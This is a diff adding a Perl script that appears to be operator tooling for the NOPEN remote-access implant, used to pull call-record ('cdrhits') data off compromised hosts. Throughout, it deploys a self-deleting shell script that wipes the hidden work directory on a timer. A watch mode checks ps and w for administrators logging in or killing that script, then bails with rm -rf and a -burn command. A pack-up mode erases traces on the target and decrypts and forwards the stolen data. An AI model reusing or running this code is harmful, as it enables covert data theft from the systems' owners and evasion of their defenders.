+    "      your path (and not in /usr/local/bin either). Make sure the\n".
+    "      CUP script runs without error.$COLOR_NORMAL\n\n"
+      unless ($contents =~ m,/bash,);
+  ($ans) = offerabort
+    (#".\n\n".
+     "CUP (clean-up) script that will be deployed as $cupname:\n\n".
+     $contents."\n\n".
+     "If you continue here, this watch/bail mode $prog will upload/execute\n".
+     "the above shell script. Watch its output, be sure the script indicates\n".
+     "the number of seconds as $testsecs. This will confirm the script is\n".
+     "counting down from $cupsleep properly.\n".
+     "");
+  nopenaddpath($workdirparent);
+  doit("-put $localcup $workdirparent/$cupname");
+  ($output) = doit("$cupname &");
+  unless ($output =~ /you have $testsecs/) {
+    doit("rm $workdirparent/$cupname");
+    mydie(".\n\nCup script did not run properly\n".
+	  "(\"you have $testsecs\" line not seen)\n\n".
+	  "GET HELP");
+  }
+  sleep 2;
+  doit("-cd /tmp");
+  my ($usercount,$usercountold,$burnit,
+      $kavail,$dfpct,
+     ) = ();
+  my $lastalert = time();
+  while (!$burnit) {
+    my $ans = "";
+    while (1) {
+      $ans = "";
+      last if -f $touchfile;
+      my ($wps,@wps,@w,@ps,$nopenjunk,
+	  $pscount,$pslines,@psregexphits,
+	  $dfout,@df,@dfalert,
+	  $thispct,$thisavail,
+	 ) = ();
+      
+      ($wps,$nopenjunk,@wps) = doit("=ps ; ls -ald $workdirparent ; w");
+#TODO: test this =df goes into @ps first	
+#    TODO: Look into % increasing too much, check count of users
+
+      ($dfout,$nopenjunk) = doit("=df $workdirparent");
+      $dfout =~ s,[ \t]+, ,g;
+      $dfout =~ s,^\s*,,g;
+      $dfout =~ s,\n\s+,\n,g;
+      # We build @df from $dfout, which may have two lines when FIRST 
+      # field (file system)  is long (so it contains no spaces)
+      my $i = 0;
+      foreach (split(/\n/,$dfout)) {
+	$df[$i] .= " " if length $df[$i];
+	$df[$i] .= $_;
+	$i++ if (/\s+\S+\s+\S+\s+\S+/); # If at least 3 columns, line is complete
+      }
+      $dfout = join("\n",@df);
+      my $kbcol = findindex("kbytes",split(/ /,$df[0]));
+      $kbcol = findindex("K-b",split(/ /,$df[0]))
+	unless $kbcol >= 0;
+      $kbcol = findindex("kb",split(/ /,$df[0]))
+	unless $kbcol >= 0;
+      my $availcol = findindex("avail",split(/ /,$df[0]));
+      my $pctcol = findindex("capacity",split(/ /,$df[0]));
+      $pctcol = findindex("use\%",split(/ /,$df[0]))
+	unless $pctcol >= 0 ;
+
+      @df = split(/\s/,$df[1]);
+      ($thispct) = $df[$pctcol] =~ /(\d+)\%/;
+      $thisavail = $df[$availcol];
+      if ($thispct) {
+	if ($thispct > $dfpctalert) {
+	  push(@dfalert,"\n\nPartition capacity ($thispct\%) in =df is > $dfpctalert\%.\n".
+	       "If you do not bail here, the next alert will be $nextpct\%.");
+	} elsif ($dfpct and ($thispct - $dfpct > $dfjumppctalert)) {
+	  push(@dfalert,"\n\nPartition capacity ($thispct\%) just jumped by more than $dfjumppctalert\%");
+	}
+      }
+#dbg("dfout=$dfout=
+#kbcol=$kbcol=
+#availcol=$availcol=
+#pctcol=$pctcol=
+#thisavail=$thisavail=
+#thispct=$thispct=
+#df=(
+#=".join("=\n=",@df)."=\n)");
+
+      (@cuplines,$dircheck) = ();
+      foreach (@wps) {
+	if (/users*,\s.*load av/) {
+	  push(@w,$_);
+	  next;
+	}
+	if (@w) {
+	  push(@w,$_);
+	} else {
+	  $dircheck = $_ if (!$dircheck and m,^d.*$workdirparent$,);
+	  # We populate @ps with the rest, until we hit the $dircheck
+	  unless ($dircheck) {
+	    push(@ps,$_) ;
+	    $pscount++ if (m,[ /]ps ,);
+	    if ($psregexp and /$psregexp/) {
+	      push(@psregexphits,$_);
+	    }
+	    if (/\sroot\s.* .*sh .*$cupname/) {
+	      dbg("FOUND  a $cupname line: $_");
+	      push(@cuplines,$_);# do somethin with cuplines
+	    } else {
+	      dbg("Not a $cupname line: $_");
+	    }
+	  }
+	}
+      }
+      unless ($dircheck) {
+	mygzdie(".\n\n".
+		"STOPPING WATCH PROCESS. $workdirparent is NOW GONE! We must be done.");
+      }
+
+      $prompt .= "\n\n" if $prompt;
+      $prompt .= "  BAIL with this touch:     touch $touchfile\n".
+                 "  Halt watch with this:     touch $stopfile\n\n".
+	         "local time ".gmtime()." GMT:$COLOR_FAILURE Next =ps/w/=df in $checkdelay seconds...";
+      progprint($COLOR_NORMAL."\n\n".
+		$prompt) ;
+      $prompt = "";
+      $usercount = @w - 2;
+      my $wstring = join(@w,"\n");
+      my $delayadjust = time();
+dbg("delayadjust=$delayadjust=");
+      my $delay = $checkdelay;
+      if ($usercount > $usercountold or
+	  $pscount > 1 or @psregexphits or
+	  @dfalert or
+	  !@cuplines
+	 ) {
+	my $minsincelastalert = (int(100*(time() - $lastalert) / 60)/100);
+	my $more = "Your last alert was $minsincelastalert minutes ago.";
+	$more .= "\n\nA new user logged in.\n\n$wstring\n\n"
+	  if ($usercount > $usercountold);
+	$more .= "\n\nMORE THAN ONE ps COMMAND IS BEING RUN!!!\n".$pslines
+	  if ($pscount > 1);
+	$more .= "\n\nFound match to /$psregexp/ in =ps output:\n".
+	  join("\n",@psregexphits)."\n\n"
+	    if (@psregexphits);
+	$more .= "\n\nYour CUP script IS GONE, but $workdirparent is still there.\n".
+	  "That can only happen if someone KILLED YOUR CUP. Recommend\n".
+	  "IMMEDIATE BAIL NOW!!\n\n"
+	    if (!@cuplines);
+	my $nextpct = $dfpctalert + 1;
+	$more .= $dfalert[0]
+	    if (@dfalert);
+	$dfpctalert = $nextpct;
+	alertwindow(555);
+	($ans) = mygetinput
+	  ($COLOR_FAILURE."\n\n".
+	   $more.
+	   "\n\nDo you want to bail now?","Y"
+	  );
+	$lastalert = time();
+	$delayadjust -= time();
+	$delay += $delayadjust;
+      dbg("secsleft=$secsleft=
+delayadjust=$delayadjust=
+delay=$delay=
+");
+      }
+      $kavail = $thisavail;
+      $dfpct = $thispct;
+      $usercountold = $usercount;
+      last if ($ans eq "y" or -f $touchfile);
+      progprint($COLOR_FAILURE."\n\n".
+		"Continuing, $delay seconds left until next check of =df, =ps, etc.")
+	if ($delay > 1 and $delay < $checkdelay);
+      unlink($touchfile);
+      $prompt = $origprompt if $ans;
+      while ($delay-- > 0) {
+	last if (-f $touchfile);
+	if (-f $stopfile) {
+	  unlink($stopfile);
+	  mygzdie("STOPPING WATCH PROCESS. Be careful!");
+	}
+	sleep 1;
+      }
+    }
+    unlink($touchfile);
+    progprint($COLOR_FAILURE."\n".
+	      "BAILING NOW!  If you ^C this window before 3 seconds elapse, you can\n".
+	      "              avoid the rm -rf $workdirparent and the -burn (but you\n".
+	      "              should then rerun a $prog -W in watch/bail mode).");
+    alertwindow();
+    sleep 3;
+    $burnit++;
+  }
+  doit("rm -rf $workdirparent","-burn");
+  mygzdie(".\n\nYou did not type BURN!!\n".
+	"The $workdirparent directory is GONE, but you are STILL ON!");
+}# watchbail
+
+sub mygzdie {
+  local (@arr) = (@_);
+  my ($them,$are,$a,$more,$more2,$s,$es,$more3) = ("it","is"," a");
+  foreach (@cuplines) {
+    # If $more already defined, we're on #2 or better, use plurals
+    if ($more) {
+      $more3 = "You can, however, kill -9 all but one of them if you want.";
+      $s = "s";
+      $es = "es";
+      $them = "them";
+      $are = "are";
+      $a = "";
+    }
+    $more .= " $1" if /\sroot\s+(\d+)/;
+    $more2 .= "$_\n";
+  }
+  if (@cuplines) {
+    if ($arr[0] =~ /STOPPING WATCH.*Be careful/) {
+      $arr[0] .=
+	"\n\nThere $are still$a CUP process$es running. More than one is not the prettiest\n".
+	"thing in the =ps output, but is safe to do. NONE at all puts you at risk of\n".
+	"leaving the box dirty if you lose the connection. All should die nicely once\n".
+	"$workdirparent is gone. $more3\n\n".
+        $more2."\n";
+      #, you are provided\n".
+      #      "a kill -9 pastable to kill $them, but you are no longer protected by it if you do:\n\n".
+      #      "    kill -9 $more";
+    } else {
+      $arr[0] .= "\n\nThe following CUP process$es are NO LONGER running,\n".
+	"since $workdirparent is gone:\n\n".
+	$more2."\n\n".
+	"In case you don't believe: \n".
+	"    =ps | grep $cupname\$";
+    }
+  }
+  mydie(@arr);
+}
+
+sub alertwindow {
+  return if fork();
+  local ($delay) = (@_);
+  close(STDOUT);
+  close(STDERR);
+  close($socket);
+  $delay = 8888 unless $delay > 0;
+  exec("1x -geometry 91x68-0+0  -e beeps $delay");
+}
+
+sub getverboseopt {
+  local($whatbin) = (@_);
+  my $val = eval "\$${whatbin}opts";
+  return $val if length($val);
+  return "" unless ($socket and $whatbin);
+  my ($output,,@output) = doit("man $whatbin");
+  my ($verboseline) = grep /[-]{1,2}v.*erbose/i,@output;
+  if ($verboseline =~ /([-]{1,2}v\S*)/i) {
+    $val = " $1";
+  } else {
+    $val = " ";
+  }
+  newhostvar("${whatbin}opts",$val);
+  return $val;
+}
+
+sub buildcup {
+  # Take inputs, build cup script from them in $opup,
+  # return full path to new script.
+  local($wipedir,$scriptname,$delaysecs) = (@_);
+  my $contents = "";
+  my $cupscript = "$opup/cup.getcdrhitsgz";
+  $wipedir =~ s,/+,/,g;
+  $scriptname = "$wipedir/$scriptname" unless $scriptname =~ m,^/,;
+  preservefile($cupscript);
+  # We prefer bash
+  my ($output) = nopenlss("-UPQ","bash");
+  my ($shell) = $output =~ m, (/.*bash),;
+  unless ($shell) {
+    nopenaddpath("/usr/local/bin:/usr/local/sbin");
+    ($output) = nopenlss("-UPQ","bash");
+    ($shell) = $output =~ m, (/.*bash),;
+  }
+  $shell = "/bin/sh" unless ($shell);
+  open(CDROUT,">$cupscript") or mydie("Cannot write to $cupscript");
+  $contents = "#!$shell
+cd /
+rm $scriptname
+trap : TERM
+COUNT=$delaysecs
+CLOSED=\"\"
+LASTFILE=\"\"
+LASTMOD=$delaysecs
+while [ 1 ] ; do
+  COUNT=\$((COUNT-1))
+  DIFF=\$((LASTMOD-COUNT))
+  NEWLASTFILE=`ls -lcrt $wipedir/*/* 2>/dev/null| tail -1`
+  [ \"\$CLOSED\" ] || echo diff=\$DIFF lastfile=\$LASTFILE count=\$COUNT lastmod=\$LASTMOD newlastfile=\$NEWLASTFILE
+  if [ \"\$LASTFILE\" = \"\$NEWLASTFILE\" ] ; then
+     DIFF=\$((LASTMOD-COUNT))
+     [ \$DIFF -gt $cupinactivedelay ] && break
+  else
+     LASTFILE=\"\$NEWLASTFILE\"
+     LASTMOD=\$COUNT
+  fi
+
+  [ \"\$CLOSED\" ] || echo you have \$COUNT seconds until cleanup
+  [ \"\$CLOSED\" ] || exec >&- 2>&-
+  CLOSED=yes
+  [ \$COUNT -gt 0 ] || break
+  [ -d $wipedir ] || break
+  sleep 1
+done
+rm -rf $wipedir
+";
+  if ($wipedir =~ m,^/(tmp|usr|var|bin|etc|lib|mnt|root|proc|home|vol|dev|opt|devices|sbin)/*$, or
+      ($host_hiddendir and $wipedir =~ m,$host_hiddendir/*$,) or
+      $wipedir =~ m,^/*$,) {
+    mydie("buildcup(@_):\nCUP SCRIPT WOULD HAVE BEEN:\n\n$contents\n\n".
+	  "REFUSING TO PROCEED, cannot wipe \"$wipedir\"")
+  }
+  print CDROUT $contents;
+  close(CDROUT);
+  return ($cupscript,$contents);
+}
+
+sub packupanddie {
+  local($projectname) = (@_);
+  # Wipe target $workparentdir
+  # Prep files (convert to .txt)
+  # Package files
+  # Push files
+
+  my $newdir = dirname($workdirparent);
+  my ($therelist) = nopenlss("-URQ",$workdirparent);
+dbg("datadir=$datadir= therelist=$therelist=");
+  unless ($therelist) {
+    offerabort
+      ("It appears that $workdirparent is already empty, so there is nothing to clean up\n".
+       "on target. If you continue, any data already retrieved by $prog will\n".
+       "be packaged locally for delivery and ultimately pushed by a popup window.\n\n".
+       "");
+  } else {
+    offerabort
+      ("The \"Pack up mode\" should only be run when all work on target is done. If you\n".
+       "continue, the target work directory (see contents above) will be wiped with\n\n".
+       "          rm -rf $workdirparent\n\n".
+       "Data retrieved will then be packaged locally for delivery and ultimately\n".
+       "pushed by a popup window.\n\n"
+      );
+  }
+  doit("-cd $newdir");
+  ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,
+   $localpid,$localppid,$serverver,$wdir,$targetos,
+   $targetcwd,$targetpid,$targetppid) = parsestatus("force");
+  if ($therelist) {
+    doit("rm -rf $workdirparent");
+    my ($gonelist) = nopenlss("-URQ",$workdirparent);
+    dbg("gonelist=$gonelist=");
+  }
+  chdir($datadir) or 
+    mydie(".\n\n".
+	  "Has $prog collected anything from $nopen_rhostname yet?\n\n".
+	  "Cannot chdir($datadir): $!");
+  opendir(GETCDRDIR,$datadir) or mydie("Cannot opendir(GETCDRDIR,$datadir)");
+  my (@rawfiles) = grep /enc$/,readdir GETCDRDIR;
+  mydie("No raw files in $datadir to package up:\nls -al $datadir\n".
+	`ls -al $datadir 2>&1`)
+    unless @rawfiles;
+  my (@newfiles) = ();
+  foreach my $rawfile (@rawfiles) {
+    my $newfile = $rawfile;
+    $newfile =~ s/enc$/txt/;
+    dbg("RUNNING in ".`pwd`."
+
+
+$crypttool -i $rawfile -o $newfile -k $cryptkey -d -c");
+
+    chomp(my $err = `$crypttool -i $rawfile -o $newfile -k $cryptkey -d -c ; echo $?`);
+
+    mydie("Cannot run this (exited with $err):\n".
+	  "  $crypttool -i $rawfile -o $newfile -k $cryptkey -d -c")
+      if ($err ne "0");
+    push(@newfiles,$newfile);
+  }
+
+#OLD:  offerball("cdrhits","",$datadir,@newfiles);
+  my @packdir = ("./");
+  offerball(0,"cdrhits","",$datadir,\@packdir);
+  mydie("$prog \"Pack up mode\" exiting normally, see popped up windows.");
+}
+
+sub setusagetext {
+  my $str = "
+Usage: $prog [options]
+
+$prog copies the compressed data stored on the target to a temporary
+directory, and uncompresses/parses them. To split the load, run multiple
+instances of $prog, each with different (NOT OVERLAPPING) dates.
+$prog prompts for the parser and argfile to use. The default argfile
+is the most current file in $opdir containing \"argfile\".
+";
+  if ($watchmode) {
+    $str .= 
+"
+-W/watch mode first deploys a CUP (clean-up) script. This script sleeps (2.5
+hours by default), after which it wipes our parent work directory (e.g.,
+/tmp/.yada). It monitors while sleeping, exiting when the directory is gone, so
+when you clean up manually the CUP script dies on its own. The CUP script also
+monitors temporary files--if no new working file is created after a while
+(default is $def_i seconds), the CUP script will stop looping, recursively delete
+the parent working directory and exit.
+
+-W/watch mode then monitors the target =ps and w, looking for problems. If the
+-W instance sees a problem, or if you touch the local file indicating you see a
+problem, you will be asked in a prompt whether to bail or not. If you choose to
+bail, the watch mode instance will remove the parent working directory and its
+contents and issue a -burn command. (You have to answer BURN to do so.)
+";
+  }
+  $str .= "
+-P/Pack-up mode: Once all instances are done, up-arrow and add the -P option to
+remove the parent working directory (if still there) and locally decrypt, pack
+and forward the data from $opdown/via.getcdrhitsgz.HOST.IP/.
+
+OPTIONS                                        $COLOR_FAILURE\[default, if any, in brackets]$COLOR_NORMAL
+              (some options ignored in -W/watch or -P/Pack-up modes)
+
+ -h/-v        Show usage/version
+ -P           Pack up mode--wipe the work directory if still on target and
+              package and push the data via copy-fast.
+ -d wdir      Working directory on target. Defaults to the next NEW
+              subdirectory in NOPEN's CWD. This wdir AND ITS PARENT WILL
+              be wiped, so it should be ours to begin with. The wipe
+              is done either manually when done or automatically by the
+              -W/watch instance of $prog when we bail.
+";
+
+  if ($watchmode) {
+    $str .= 
+" -W           Watch / bail mode
+ -w str       Watch / bail mode, look also for regexp \"str\" in =ps output
+ -f pct       Alert if working file system grows bigger than this        $COLOR_FAILURE\[$def_f]$COLOR_NORMAL
+ -c name      Name of CUP script the watch mode deploys           $COLOR_FAILURE\[$def_c]$COLOR_NORMAL
+ -s secs      Countdown until CUP FIRES (Cleans UP)                    $COLOR_FAILURE\[$def_s]$COLOR_NORMAL
+ -i secs      How long CUP will allow without activity before          $COLOR_FAILURE\[$def_i]$COLOR_NORMAL
+              FIRING (Cleaning UP)
+ -S secs      Delay between checks in watch/bail mode                    $COLOR_FAILURE\[$def_S]$COLOR_NORMAL
+
+";
+    my $notshown = "
+ -j pct       Alert if working file system capacity shrinksgrows bigger than this    $COLOR_FAILURE\[$def_f]$COLOR_NORMAL
+";
+  } else {
+    $str .= 
+" -W           Watch / bail mode (use -W with -h for more Watch mode options)
+ -r str       Run the parser as \"str\"                                  $COLOR_FAILURE\[$def_r]$COLOR_NORMAL
+ -E ext       Extension used on data file listings                  $COLOR_FAILURE\[$def_E]$COLOR_NORMAL
+              (use \"NONE\" to use * instead of a fixed extension)
+ -l maskfile  File containing list of PATH masks to use
+              (blank/#comment lines ignored) $COLOR_FAILURE(-l or -L is required)$COLOR_NORMAL
+ -L mask      List of PATH masks to use, with letters for year, month, day
+              (\",,\" delimited, no whitespace, wildcard \"*\" OK). E.g.:
+                /remotepath/to/data/dir.YYYYMM/name*YYYYMMDD*
+              Each such path is processed for the range of dates
+              provided via -m/-M options. (-l or -L is required)
+ -m MINDATE   Earliest day to process, in YYYYMMDD format $COLOR_FAILURE(required)$COLOR_NORMAL
+ -M MAXDATE   Latest day to process, in YYYYMMDD format (defaults to
+              same as MINDATE if not provided)
+ -b exprs     Blacklist: $prog will NOT process files matching
+              these regular expressions (skip files that match), for each
+              expr given (\",,\" delimited, no whitespace)
+ -C #         Number of .gz files to process at a time.                  $COLOR_FAILURE\[$def_C]$COLOR_NORMAL
+ -k key       Used for auto decryption of data. (Must use the same key
+              parser is running with, must be all hex) $COLOR_FAILURE(required)$COLOR_NORMAL
+ -K key       \"Special\" key for parser $COLOR_FAILURE(required)$COLOR_NORMAL
+ -T proj      Project name; if used, will tar/push pulled collection
+
+";
+  }
+  $str .= "
+Usage: $prog [options]
+
+";
+  return $str;
+}
+__END__
+
+oooo...cool. Have the watch instance upload/execute this baby, with time configurable and dir right and all.....
+
+#!/bin/sh
+DIR=/tmp/.scsi
+cd /
+rm $wipedir/procclean
+trap : TERM
+COUNT=7200
+CLOSED=""
+while [ 1 ] ; do
+  sleep 1
+  COUNT=\\\$((COUNT-1))
+  echo COUNT decremented by one is $COUNT
+  [ "\\\$CLOSED" ] || exec >&- 2>&-
+  CLOSED=yes
+  [ \\\$COUNT -gt 0 ] || break
+  [ -d $wipedir ] || break
+done
+rm -rf $wipedir
